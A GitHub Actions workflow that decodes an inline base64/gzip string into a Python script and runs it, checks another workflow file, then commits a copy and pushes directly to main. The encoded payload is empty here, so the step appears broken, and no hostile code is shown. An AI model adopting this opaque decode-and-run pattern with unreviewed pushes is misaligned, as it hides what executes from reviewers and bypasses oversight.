name: ChoreScore productivity patch

on:
  push:
    branches: [main]
    paths:
      - .github/workflows/chorescore-productivity-patch.yaml

permissions:
  contents: write

jobs:
  validate:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - name: Checkout main
        uses: actions/checkout@f548e57e544e1ff5a4c46bf1e1b8685f8e4a348a
        with:
          fetch-depth: 0

      - name: Apply productivity patch
        shell: bash
        run: |
          set -euo pipefail
          printf '%s' '' | base64 -d | gzip -d > "$RUNNER_TEMP/patch.py"
          python3 "$RUNNER_TEMP/patch.py"
          git diff --check
          ruby -e 'require "yaml"; YAML.load_file(".github/workflows/chorescore-loop.yml")'
          bash .github/scripts/verify-workflow-architecture.sh
          grep -Fq "needs.candidate.result != 'cancelled'" .github/workflows/chorescore-loop.yml
          test "$(grep -Fc "needs.merge_candidate.result != 'cancelled'" .github/workflows/chorescore-loop.yml)" -eq 2
          grep -Fq 'chorescore-parallel-verification.status' .github/workflows/chorescore-loop.yml
          grep -Fq 'Complete parallel deterministic verification' .github/workflows/chorescore-loop.yml
          mkdir -p speed-generated
          cp .github/workflows/chorescore-loop.yml speed-generated/chorescore-loop-productivity.yml.txt

      - name: Stage validated workflow blob
        shell: bash
        run: |
          set -euo pipefail
          git config user.name chorescore-governance
          git config user.email chorescore-governance@users.noreply.github.com
          git add speed-generated/chorescore-loop-productivity.yml.txt
          git commit -m "ci: stage second productivity workflow"
          git push origin HEAD:main
